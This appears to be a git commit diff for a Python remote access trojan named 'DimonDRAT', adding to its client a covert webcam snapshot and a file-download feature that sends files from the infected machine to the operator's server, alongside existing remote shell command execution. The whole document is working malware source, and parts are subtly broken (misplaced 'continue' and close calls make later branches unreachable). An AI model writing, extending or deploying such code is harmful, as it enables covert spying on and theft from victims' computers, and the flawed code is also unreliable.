79fac61db6bd86fa265eea8c3bbaa381136248b6
Seg YT <sasilisos69@gmail.com>
2020-06-18 16:42:24 +0000

    DimonDRAT - Coded by SegYT
    Added download option and cam snap!

--- client.py
+++ client.py
@@ -1,18 +1,51 @@
 import socket
 import subprocess
 import sys
+import cv2
+import os
 
 SERVER_HOST = sys.argv[1]
 SERVER_PORT = 5003
-BUFFER_SIZE = 1024
+BUFFER_SIZE = 4096
 
 s = socket.socket()
 s.connect((SERVER_HOST, SERVER_PORT))
 
 message = s.recv(BUFFER_SIZE).decode()
 
+def webcam():
+  c = cv2.VideoCapture(0)
+  return_value, image = c.read()
+  cv2.imwrite("camera.png", image)
+  del(c)
+  s.send("webcam")
+  f = open("camera.png", "rb")
+  i = f.read(4096)
+  while i != "":
+    s.send(i)
+    i = f.read()
+  f.close()
+  s.send("[*]Snap was succesfully made!\n")
+  os.remove("camera.png")
+
+def upload():
+  filename = s.recv(4096)
+  f = open(filename, "rb")
+  i = f.read(4096)
+  while(i):
+    s.send(i)
+    i = f.read(4096)
+  f.close()
+  s.send("[*]Complete!")
+
 while True:
     command = s.recv(BUFFER_SIZE).decode()
+    if str(command) == "download":
+      upload()
+      continue
+    if str(command) == "webcamsnap":
+      webcam()
+    continue
     if command.lower() == "exit":
         break
     output = subprocess.getoutput(command)
--- main.py
+++ main.py
@@ -3,7 +3,7 @@ import socket
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 5003
 
-BUFFER_SIZE = 1024
+BUFFER_SIZE = 4096
 
 s = socket.socket()
 
@@ -19,9 +19,29 @@ print(f"{client_address[0]}:{client_address[1]} Connected!")
 message = "Hello!".encode()
 client_socket.send(message)
 
+def download():
+  filename = input("[*]File Name: ")
+  client_socket.send(filename)
+  f = open(filename, "wb")
+  command = client_socket.recv(4096)
+  i = client_socket.recv(4096)
+  while not ("[*]Complete!" in str(i)):
+    f.write(i)
+    i = client_socket.recv(4096)
+  f.close()
+
 while True:
     command = input("DimonDRAT >")
     client_socket.send(command.encode())
+    if str(command) == "download":
+      download()
+      continue
+    if str(command) == "webcamsnap":
+      f = open("camera.png", "wb")
+      img = client_socket.recv(4096)
+      f.write(img)
+    f.close()
+    continue
     if command.lower() == "exit":
         break
     results = client_socket.recv(BUFFER_SIZE).decode()
